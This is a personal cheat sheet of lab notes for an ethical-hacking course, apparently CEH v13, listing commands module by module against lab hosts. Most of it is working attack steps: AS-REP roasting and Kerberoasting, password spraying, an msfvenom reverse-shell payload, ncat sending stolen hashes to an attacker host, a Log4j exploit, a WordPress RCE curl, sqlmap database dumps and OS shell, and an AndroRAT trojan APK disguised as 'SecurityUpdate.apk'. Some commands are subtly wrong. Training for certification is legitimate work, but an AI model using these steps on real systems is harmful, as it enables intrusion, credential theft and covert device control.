					LAB2 Footprinting Through Internet Research Services
					
https://www.netcraft.com
https://dnsdumpster.com/
https://pentest-tools.com
sherlock "Elon Musk"
https://www.social-searcher.com  Social Media search
https://whois.domaintools.com
https://www.tamos.com  --> SmartWhois
Batch IP Converter (http://www.sabsoft.com)
http://www.kloth.net/services/nslookup.php
traceroute tools such as PingPlotter (https://www.pingplotter.com/)
Traceroute NG (https://www.solarwinds.com)
MxToolbox (https://mxtoolbox.com/), 
Social Catfish (https://socialcatfish.com/), 
IP2Location Email Header Tracer (https://www.ip2location.com/) 

										LAB3 Scanning networks
										
nmap -sn -PR [Target IP Address]   ---> -sn: disables port scan and -PR: performs ARP ping scan.
nmap -sn -PU [Target IP Address]  ----> -PU: performs the UDP ping scan.
nmap -sn -PE [Target IP Address]   ---->-PE: performs the ICMP ECHO ping scan.
nmap -sn -PP [Target IP Address]   ----> -PP: performs the ICMP timestamp ping scan.
nmap -sn -PM [target IP address]  ----> ICMP Address Mask Ping Scan
nmap -sn -PS [target IP address] ---> TCP SYN Ping Scan: This technique sends empty TCP SYN packets to the target host, ACK response means that the host is active.
nmap -sn -PA [target IP address]   ---->TCP ACK Ping Scan: This technique sends empty TCP ACK packets to the target host; an RST response means that the host is active.
nmap -sn -PO [target IP address]  ---> IP Protocol Ping Scan: This technique sends different probe packets of different IP protocols to the target host, any response from any probe indicates that a host is active.
Windows Zenmap Tools for help

IDLE/IPID Header Scan: A TCP port scan method that can be used to send a spoofed source address to a computer to discover what services are available.

# nmap -sI -v [target IP address]

SCTP INIT Scan: An INIT chunk is sent to the target host; an INIT+ACK chunk response implies that the port is open, and an ABORT Chunk response means that the port is closed.

# nmap -sY -v [target IP address]

SCTP COOKIE ECHO Scan: A COOKIE ECHO chunk is sent to the target host; no response implies that the port is open and ABORT Chunk response means that the port is closed.

# nmap -sZ -v [target IP address]
nmap -A [Target IP Address]   ---> -A: to perform an aggressive scan.
nmap -O [Target IP Address]   ---> -O: performs the OS discovery.
nmap --script smb-os-discovery.nse [Target IP Address]  ---> script: specifies the customized script and smb-os-discovery.nse: attempts to determine the OS, computer name, domain, workgroup, and current time over the SMB protocol (ports 445 or 139).
 nmap -f [Target IP Address]   ---> -f switch is used to split the IP packet into tiny fragment packets.
 nmap -sT -Pn --spoof-mac 0 [Target IP Address]  --> in this command --spoof-mac 0 represents randomizing the MAC address, -sT: performs the TCP connect/full open scan, -Pn is used to skip the host discovery.
 nmap -A -sC -sV 10.10.1.22   full scan
 nmap -Pn -sS -A -oX Test 10.10.1.0/24  --- > Here, we are scanning the whole subnet 10.10.1.0/24 for active hosts.
nmap -sV --script nbstat.nse <TARGET IP>
msfconsole
use auxiliary/scanner/portscan/syn
show options
set INTERFACE eth0
set PORTS 80
set RHOSTS 10.10.1.5-23
set THREADS 50

												ENUMERATION LAB4

nbtstat -c or -a <IP> -----> lists the contents of the NetBIOS name

net use  --------> displays information about the target such as connection status, shared folder/drive

snmpwalk -v 2c or 1 -c public [target IP]   -> displays all the OIDs, variables and other associated information
-v: specifies the SNMP version number (1 or 2c or 3) and -c: sets a community string.

python3 rpc-scan.py [Target IP address] --rpc
--rpc: lists the RPC (portmapper).

dig ns [Target Domain] --> ns returns name servers in the result
dig @[NameServer] [Target Domain] axfr  ---> In this command, axfr retrieves zone information.

nslookup
set querytype=soa sets the query type to SOA (Start of Authority) record to retrieve administrative information about the DNS zone
ls -d [Name Server] ---> requests a zone transfer of the specified name server.

nmap -p 25 --script=smtp-enum-users [Target IP Address]
-p: specifies the port, and --script: argument is used to run a given script (here, the script is smtp-enum-users).

nmap -p 25 --script=smtp-commands [Target IP Address]
-p: specifies the port, and -script: argument is used to run a given script (here, the script is smtp-commands).

Global Network Inventory  on Windows machine 
Global Network Inventory is used as an audit scanner in zero deployment and agent-free environments. 

connect RDP app for linux
xfreerdp /u:'username' /p:'password' /v:'Target IP':'Target Port'
												LAB5 Vulnerability
												
https://cwe.mitre.org/  ---> Here, we are searching for the vulnerabilities of the running services that were found in the target systems in previous module labs (Module 04 Enumeration).
Exploit DB----->searchsploit vulnerability
docker run -d -p 443:443 --name openvas mikesplain/openvas

												LAB6 System hacking
												
sudo responder -I eth0		--> Responder is an LLMNR, NBT-NS, and MDNS poisoner. It responds to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix. By default, the tool only responds to a File Server Service request, which is for SMB.
pluma hash.txt
john hash.txt ----> decrypt hash file

docker run -d -p 80:80 reverse_shell_generator   ---> A reverse shell generator is a tool or script used in cybersecurity and ethical hacking for creating reverse shell payloads
https://spyrix.com/    ----> Spyrix facilitates covert remote monitoring of user activities in real-time

	TASK1. Perform Initial Scans to Obtain Domain Controller IP and Domain Name
88/TCP kerberos-sec and port 389/TCP LDAP
nmap -A -sC -sV 10.10.1.22
   
    TASK2. Perform AS-REP Roasting Attack
cd impacket/examples/
python3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip 10.10.1.22  
GetNPUsers.py: Python script to retrieve AD user information.

CEH.com/: Target AD domain.

-no-pass: Flag to find user accounts not requiring pre-authentication.

-usersfile ~/ADtools/users.txt: Path to the file with the user account list.

-dc-ip 10.10.1.22: IP address of the DC to query.
john --wordlist=/root/ADtools/rockyou.txt joshuahash.txt
   
    TASK3.  Spray Cracked Password into Network using CrackMapExec
    Task 1, from the Nmap results we can observe that other hosts in the subnet are running services such as RDP, SSH, and FTP. Therefore, we can perform password spraying on each service individually to check for correct credentials. In this task, we will be focusing on RDP. However, you can explore and check other services.
    cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p "cupcake" to perform password spraying.

rdp: Targets the Remote Desktop Protocol (RDP) service.

10.10.1.0/24: IP address range to target, encompassing all hosts within the subnet 10.10.1.0 with a subnet mask of 255.255.255.0.

-u /root/ADtools/users.txt: Specifies the path to the file containing user accounts for authentication.

-p "cupcake": Password which we cracked using AS-REP Roasting to test against the RDP service on the specified hosts.
Remmina Remote Desktop Client --->RDP for ParrotSEC
   
   TASK 4. Perform Attack on MSSQL service
pluma user.txt  ---->SQL_srv
hydra -L user.txt -P /root/ADtools/rockyou.txt 10.10.1.30 mssql
python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433
SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell'      -----> returning a value of 1, indicating that xp_cmdshell is enabled on the server.
msfconsole   ----->
use exploit/windows/mssql/mssql_payload
show option -----> help
set RHOST 10.10.1.30
set USERNAME SQL_srv
set PASSWORD batman
set DATABASE master
whoami
    TASK 5. Perform Privilege Escalation
     python3 -m http.server 
     wget http://10.10.1.13:8000/winPEASx64.exe -o winpeas.exe.
     msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=8888 -f exe > /root/ADtools/file.exe
     move file.exe file.bak ; wget http://10.10.1.13:8000/file.exe -o file.exe.
	TASK 6. Perform Kerberoasting Attack
	wget http://10.10.1.13:8000/Rubeus.exe -o rubeus.exe ; wget http://10.10.1.13:8000/ncat.exe -o ncat.exe.
	rubeus.exe kerberoast /outfile:hash.txt.
	nc -lvp 9999 > hash.txt 
	ncat.exe -w 3 10.10.1.13 9999 < hash.txt
	hashcat -m 13100 --force -a 0 hash.txt /root/ADtools/rockyou.txt.
	-m 13100: This specifies the hash type. 13100 corresponds to Kerberos 5 AS-REQ Pre-Auth etype 23 (RC4-HMAC), a specific format for Kerberos hashes.
	--force: This option forces Hashcat to ignore warnings and run even if there are compatibility issues. Use this with caution, as it might cause instability or incorrect results.
	-a 0: This specifies the attack mode. 0 stands for a straight attack, which is a simple dictionary attack where Hashcat tries each password in the dictionary as it is.
	hash.txt: is the input file containing the hashes to crack
	/root/ADtools/rockyou.txt: is the wordlist file used for the attack
							
											LAB7 Malware Threats
											
njRAT RAT Trojan    ----> Attackers use Remote Access Trojans (RATs) to infect the target machine to gain administrative access.
JPS Virus Maker Tool   ----> The JPS Virus Maker tool is used to create its own customized virus. This tool has many options for building that can be used to create a virus.
https://www.hybrid-analysis.com   ---> Hybrid Analysis is a free service that analyzes suspicious files and URLs and facilitates the quick detection of unknown threats such as viruses, worms, Trojans, and other kinds of malware.
https://app.any.run
https://valkyrie.comodo.com
https://www.joesandbox.com
https://virusscan.jotti.org

Virus ELF Test File
Detect it Easy ---> analyze ELF file. Detect It Easy (DIE) is an application used for determining the types of files.
use other packaging/obfuscation tools such as Macro_Pack (https://github.com), 
UPX (https://upx.github.io), 
ASPack (http://www.aspack.com), 
or VMprotect (https://vmpsoft.com) to identify packing/obfuscation methods.

View Virus File
OllyDbg is a debugger that emphasizes binary code analysis, which is useful when source code is unavailable. It traces registers, recognizes procedures, API calls switches, tables, constants, and strings, and locates routines from object files and libraries.
IDA View-A

Monitoring Ports
CurrPorts----> CurrPorts is a piece of network monitoring software that displays a list of all the currently open TCP/IP and UDP ports on a local computer
TCPView -----> The TCPView main window appears, displaying the details such as Process Name, Process ID, Protocol, State, Local Address, Local Port, Remote Address, Remote Port, as shown in the screenshot.
TCP Port/Telnet Monitoring (https://www.dotcom-monitor.com), 
PRTG Network Monitor (https://www.paessler.com), 
SolarWinds Open Port Scanner (https://www.solarwinds.com) or to perform port monitoring.

Monitoring Process
Process Monitor (Procmon) is a monitoring tool for Windows that shows the real-time file system, Registry, and process and thread activity. It combines the features of two legacy Sysinternals utilities, Filemon and Regmon
Process Explorer (https://docs.microsoft.com), 
OpManager (https://www.manageengine.com), 
Monit (https://mmonit.com), 
ESET SysInspector (https://www.eset.com), 
or System Explorer (https://systemexplorer.net) to perform process monitoring.

											LAB8 Sniffing
											
MAC Flooding using macof  --->MAC flooding is a technique used to compromise the security of network switches that connect network segments or network devices. Attackers use the MAC flooding technique to force a switch to act as a hub, so they can easily sniff the traffic.
Yersinia ---> is a network tool designed to take advantage of weaknesses in different network protocols such as DHCP.
Wireshark  ---> http.request.method == POST
edit-find--->pwd
	ARP sniffing
Cain & Abel starts scanning for MAC addresses and lists all those found.
hping3 [Target IP Address] -c 100000 command (here, target IP address is 10.10.1.11 [Windows 11]).   
-c: specifies the packet count.
 nmap --script=sniffer-detect [Target IP Address/ IP Address Range] (here, target IP address is 10.10.1.19 [Windows Server 2019]) to start scanning.
	
										   LAB9 Social Engineering
	
Sniff Credentials using the Social-Engineer Toolkit (SET)
https://www.netcraft.com/apps-extensions ---> detect phishing attack for browser
 
										   LAB10 Denial of Service (DDOS)
										   
Anti DDoS Guardian is a DDoS attack protection tool.
You can also use other DoS and DDoS protection tools such as, 
DOSarrest's DDoS protection service (https://www.dosarrest.com), 
DDoS-GUARD (https://ddos-guard.net), Radware DefensePro X (https://www.radware.com), 
F5 DDoS Attack Protection (https://www.f5.com) to protect organization's systems and networks from DoS and DDoS attacks.

										LAB11. Session Hijacking
										
ipconfig/flushdns command to reset dns cache and close the Command Prompt.
 Caido assists security professionals and enthusiasts in efficiently auditing web applications. It offers exploration tools, including sitemap, history, and intercept features, which aid in identifying vulnerabilities and analyzing requests in real-time.
 Hetty is an HTTP toolkit for security research. It aims to become an open-source alternative to commercial software such as Burp Suite Pro, with powerful features tailored to the needs of the InfoSec and bug bounty communities
 
										LAB12. Hacking Web Servers
										
1. Footprint a Web Server using Netcat and Telnet

Netcat -->Netcat is a networking utility that reads and writes data across network connections, using the TCP/IP protocol. 
Telnet -->Telnet is a client-server network protocol. It is widely used on the Internet or LANs.
nc -vv www.moviescope.com 80
GET / HTTP/1.0
telnet www.moviescope.com 80
GET / HTTP/1.0

2. Enumerate Web Server Information using Nmap
nmap -sV --script=http-enum [target website]
nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap- www.goodshopping.com.  --> discover the hostnames that resolve the targeted domain.
nmap --script http-trace -d www.goodshopping.com.   ---> Perform an HTTP trace on the targeted domain
nmap -p80 --script http-waf-detect www.goodshopping.com.  ---> scan the host and attempt to determine whether a web server is being monitored by an IPS, IDS, or WAF.

searchsploit -t Apache RCE

3. Web Server by Exploiting Log4j Vulnerability
nmap -sV -sC 10.10.1.9
8080/Apache Tomcat/Coyote 1.1 vulnerability
for install ubuntu --> sudo apt-get install docker.io, 
cd log4j-shell-poc/ ;
docker build -t log4j-shell-poc;
docker run --network host log4j-shell-poc
install jdk 8 for use --->
tar -xf jdk-8u202-linux-x64.tar.gz
move the jdk1.8.0_202 into /usr/bin/. To do that, type mv jdk1.8.0_202 /usr/bin/
pluma poc.py
line 62, replace jdk1.8.0_20/bin/javac with /usr/bin/jdk1.8.0_202/bin/javac.
line 87 and replace jdk1.8.0_20/bin/java with /usr/bin/jdk1.8.0_202/bin/java. 
line 99 and replace jdk1.8.0_20/bin/java with /usr/bin/jdk1.8.0_202/bin/java.
open new terminal window and type nc -lvp 9001
python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001 ------> start the exploitation and create payload
Username field paste the payload that was copied in previous step and in Password field type password and press Login button
whoami
										LAB13. Hacking Web Applications
										
nmap -T4 -A -v [Target Web Application]    -----> In this command, -T4: specifies setting time template (0-5), -A: specifies aggressive scan, and -v: enables the verbose output (include all hosts and ports in the output).
telnet www.moviescope.com 80
GET / HTTP/1.0   --->The result appears, displaying information related to the server name and its version, technology used.
zaproxy ----> OWASP Zed Attack Proxy (ZAP) is an integrated penetration testing tool for finding vulnerabilities in web applications. 
SmartScanner---windows Web Application Vulnerability Scanner
WPScan Vulnerability Database (https://wpscan.com), 
Codename SCNR (https://ecsypno.com), 
AppSpider (https://www.rapid7.com), 
Uniscan (https://github.com) and 
N-Stalker (https://www.nstalker.com).

2. Perform a Brute-force Attack using Burp Suite

go to WordPress login page -----> http://10.10.1.22:8080/CEH/wp-login.php?.
Change Parrot OS HTTP Proxy as 127.0.0.1 and the Port as 8080, v5 to 9050
Launch  Burpsuite CE app ---> Proxy--->  Intercept is on
Go to Wordpress login page and write ----> admin/password and log in.
Switch back to the Burp Suite window;   Now, right-click anywhere on the HTTP request window, and from the context menu, click "Send to Intruder"
Now, click on the Intruder tab from the toolbar and observe that under the Intruder tab, the Positions tab appears by default.
In the Positions tab under the Intruder tab observe that Burp Suite sets the target positions by default, as shown in the HTTP request. 
Click the Clear § button from the right-pane to clear the default payload values.
After select Cluster bomb from the Attack type drop-down list.
set the username and password as the payload values. Then Add § from the right-pane. Similarly, select the password value entered in Step#14 and click Add § from the right-panel.
The symbol '§' will be added at the start and end of the selected payload values. Here the values are admin and password.
Navigate to the Payloads tab under the Intruder tab and ensure that under the Payload Sets section, the Payload set is selected as 1, and the Payload type is selected as Simple list.
Then select Payload settings [Simple list] section, click the Load… button
navigate to the location /home/attacker/Desktop/CEHv13 Module 14 Hacking Web Applications/Wordlist, select the username.txt file, and click the Open button.
load a password file for the payload set 2. To do so, under the Payload Sets section, select the Payload set as 2 from the drop-down options and ensure that the Payload type is selected as Simple list.
Then click load---> navigate to the location /home/attacker/Desktop/CEHv13 Module 14 Hacking Web Applications/Wordlist, select the password.txt file, and click the Open button.selected password.txt file
START ATTACK
After the progress bar completes, scroll down and observe the different values of Status and Length. Here, Status=302 and Length= 1155.
Then click Intercept is off and set proxy setting to default

3. Perform Remote Code Execution (RCE) Attack

wpscan --url http://10.10.1.22:8080/CEH --api-token [API Token from https://wpscan.com]
RCE vulnerability plugin name is wp-upg
To perform RCE attack, run ---> 
curl -i 'http://10.10.1.22:8080/CEH/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:whoami:NULL:NULL'

4. Detect Web Application Vulnerabilities using Wapiti Web Application Security Scanner
The Wapiti web-application vulnerability scanner identifies security weaknesses in web applications by crawling websites and performing black-box testing. It detects issues like SQL injections, XSS, and other vulnerabilities.
cd wapiti
python3 -m venv wapiti3
. wapiti3/bin/activate
pip install .
wapiti -u https://www.certifiedhacker.com  ---> to perform web application security scanning on certifiedhacker.com website.
 cd /root/.wapiti/generated_report/ to navigate to generated_report directory.
 firefox certifiedhacker.com_xxxxxxxx_xxxx.html

Nessecary commands:
Check if the target url www.certifiedhacker.com has web application firewall  ---->
nmap -p 80,443 --script http-waf-detect www.goodshopping.com.
Check if the target url https://www.certifiedhacker.com is protected with web application firewall using wafwoof --->
wafw00f https://certifiedhacker.com
Use load balancing detector on target domain yahoo.com.---->
lbd yahoo.com
Launch whatweb on the target website www.moviescope.com to perform website footprinting----> 
whatweb -v www.moviescope.com | tee whatweb_log.txt
Perform the Vulnerability scan on the target url www.moviescope.com using nmap --->
nmap --script vuln www.moviescope.com
Use Sn1per tool and scan the target url www.moviescope.com for web vulnerabilities---->
sniper -t www.moviescope.com -w scan.txt
Scan the web content of target url www.moviescope.com using Dirb----->
dirb www.moviescope.com
Scan the web content of target url www.moviescope.com using Gobuster----->
gobuster dir -u  www.moviescope.com -w [wordlists]
gpt --chat wah --shell "create and run a custom script for web application footprinting and vulnerability scanning. The target url is www.certifiedhacker.com"

													LAB14. SQL Injection	

1. SQL Injection Attack Against MSSQL to Extract Databases using sqlmap

open site http://www.moviescope.com and paste login&pass then go to viewprofile page
Click the  Inspect (Q) then click Console tab, type document.cookie in the lower-left corner of the browser, and press Enter.
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value that you copied ] --dbs then yes,yes
In this query, 
-u specifies the target URL (the one you noted down in Step#7), 
--cookie specifies the HTTP cookie header value, 
--dbs enumerates DBMS databases.
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied]" -D moviescope --tables ---> get moviescope database table
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied]" -D moviescope -T User_Login --dump  -----> get all dump users login&password
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" --os-shell ---> go to os shell folder yes,yes
other SQL injection tools such as Mole (https://sourceforge.net), 
jSQL Injection (https://github.com), 
NoSQLMap (https://github.com), 
Havij (https://github.com),
blind_sql_bitshifting (https://github.com)

2. Detect SQL Injection Vulnerabilities using OWASP ZAP

Zap 2.14.0 ---->  for Windows detect sql injection vulnerabilities
other SQL injection detection tools --->
Damn Small SQLi Scanner (DSSS) (https://github.com), 
Snort (https://snort.org), 
Burp Suite (https://www.portswigger.net), 
HCL AppScan (https://www. hcl-software.com)
											LAB15. Hacking Wireless Networks
											
AirMagnet WiFi Analyzer PRO (https://www.netally.com), 
SteelCentral Packet Analyzer (https://www.riverbed.com), 
Omnipeek Network Protocol Analyzer (https://www.liveaction.com),
CommView for Wi-Fi (https://www.tamos.com) to analyze Wi-Fi traffic.

Crack a WPA2 Network using Aircrack-ng  
aircrack-ng -a2 -b [Target BSSID] -w /home/attacker/Desktop/Wordlist/password.txt '/home/attacker/Desktop/Sample Captures/WPA2crack-01.cap'
-a is the technique used to crack the handshake, 2=WPA technique.
-b refers to bssid; replace with the BSSID of the target router.
-w stands for wordlist; provide the path to a wordlist.

hashcat (https://hashcat.net), 
Portable Penetrator (https://www.secpoint.com), 
WepCrackGui (https://sourceforge.net) to crack WEP/WPA/WPA2 encryption.

												LAB16. Hacking Mobile Platforms
												
1.Exploit the Android Platform through ADB using PhoneSploit-Pro
cd PhoneSploit-Pro
python3 phonesploitpro.py ---->yes
then enter phone ip address
after connect you can choise what you want
select 14 for go shell
adb connect <Target IP:5555>
adb devices
adb shell --->get shell

2: Hack an Android Device by Creating APK File using AndroRAT
cd AndroRAT
python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk command to create an APK file (here, SecurityUpdate.apk).
--build: is used for building the APK
-i: specifies the local IP address (here, 10.10.1.13)
-p: specifies the port number (here, 4444)
-o: specifies the output APK file (here, SecurityUpdate.apk)
cp /home/attacker/AndroRAT/SecurityUpdate.apk /var/www/html/share/ command to copy the SecurityUpdate.apk

Run mkdir /var/www/html/share command to create a shared folder
Run chmod -R 755 /var/www/html/share command
Run chown -R www-data:www-data /var/www/html/share
service apache2 start

python3 androRAT.py --shell -i 0.0.0.0 -p 4444
--shell: is used for getting the interpreter
-i: specifies the IP address for listening (here, 0.0.0.0)
-p: specifies the port number (here, 4444)
In the Android Emulator GUI, click the Chrome icon on the lower section of the Home Screen to launch the browser
In the address bar, type http://10.10.1.13/share and press Enter.Download the apk file and install. 

You can check your parrot machine
You can also use other Android hacking tools such as hxp_photo_eye (https://github.com), 
Gallery Eye (https://github.com), 
mSpy (https://www.mspy.com), and 
Hackingtoolkit (https://github.com) to hack Android devices.

3. Secure Android Devices from Malicious Apps using AVG
You can use other mobile antivirus and anti-spyware tools such as Certo: 
Anti Spyware & Security (https://play.google.com), 
Anti Spy Detector - Spyware (https://play.google.com), 
iAmNotified - Anti Spy System (https://iamnotified.com), 
Anti Spy (https://www.protectstar.com), 
Secury - Anti Spy Security (https://apps.apple.com) to secure mobile devices from malicious apps.

						LAB18.IoT and OT Hacking

Gather Information using Online Footprinting Tools
The information regarding the target IoT and OT devices can be acquired using various online sources such as Whois domain lookup, advanced Google hacking, and Shodan search engine. The gathered information can be used to scan the devices for vulnerabilities and further exploit them to launch attacks.

https://www.whois.com/whois
https://www.exploit-db.com/google-hacking-database.
https://account.shodan.io/login
						
						LAB19. Cryptography
Hashmyfiles -For calculating and comparing hashes of files
Cryptool - For encryption/decryption of the hex data-by manipulating the key length
BCtextEncoder- For encoding and decoding text in file (.hex)
CryptoForge-For encrypting and decrypting the files
Veracrypt-For hidding and Ecrypting the disk partitions

1. Perform Multi-layer Hashing using CyberChef

CyberChef enables a wide array of "cyber" tasks directly in browser. It offers a wide range of operations and transformations, from basic text manipulation to complex cryptographic functions which include various hashing techniques such as MD5, SHA-1, SHA-256, SHA-512, etc., and encoding techniques such as text to hexadecimal, binary, Base64, or URL encoding.
https://gchq.github.io/CyberChef/

2. Perform File and Text Message Encryption using CryptoForge
CryptoForge is a file encryption software for personal and professional data security. It allows you to protect the privacy of sensitive files, folders, or email messages by encrypting them with strong encryption algorithms. Once the information has been encrypted, it can be stored on insecure media or transmitted on an insecure network-such as the Internet-and remain private. Later, the information can be decrypted into its original form.
					
3. Create and Use Self-signed Certificates	
4. Perform Disk Encryption using VeraCrypt
VeraCrypt is a software used for establishing and maintaining an on-the-fly-encrypted volume (data storage device). On-the-fly encryption means that data is automatically encrypted just before it is saved, and decrypted just after it is loaded, without any user intervention

Nessesary commands:
echo -n  'TEXT' | md5sum awk '{print $1}' ---> print text in MD5 hash
echo -n  'TEXT' | sha1sum awk '{print $1}' ---> print text in SHA1 hash
echo 'Hello World' | base64 > output.txt  ---> Encrypt 'Hello World' using the base64 algorithm without adding a newline character, and save the result to Output.txt file
base64 -d /path/to/encryptedfile /path/to/decryptfile  --->Decrypt the contents of encrypted Output.txt file located at /home/attacker using base64 algorithm
crc32 /path/to/file  ---> CRC32 (Cyclic Redundancy Check 32) is a widely used hash function to detect accidental changes to raw data. It generates a 32-bit checksum, providing a quick and efficient way to verify data integrity in storage and communication protocols like Ethernet, ZIP files, and various digital formats.
